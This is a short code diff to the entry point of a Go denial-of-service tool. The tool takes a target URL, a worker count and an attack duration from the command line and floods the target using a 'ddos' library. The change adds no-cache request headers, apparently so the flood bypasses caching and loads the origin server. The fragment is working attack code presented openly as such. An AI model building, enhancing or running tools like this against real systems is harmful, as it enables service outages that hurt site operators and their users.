@@ -12,13 +12,20 @@ func main() {
 	targetUrl := flag.String("u", "http://127.0.0.1:80", "target url")
 	workTime := flag.Int("t", 1, "how many  seconds attack keep")
 	flag.Parse()
+	
 	log.Println("start ~~~")
 	log.Printf("worker | %d\n", *workers)
 	log.Printf("target | %s", *targetUrl)
 	log.Printf("keep   | %d Seconds\n", *workTime)
-	d, err := ddos.New(*targetUrl, *workers)
+	
+	headers := map[string]string{
+	    "Cache-Control": "no-cache",
+	    "Pragma": "no-cache",
+	}
+	
+	d, err := ddos.New(*targetUrl, *workers, headers)
 	if err != nil {
-		panic(err)
+	    panic(err)
 	}
 	d.Run()
 	time.Sleep(time.Duration(*workTime) * time.Second)
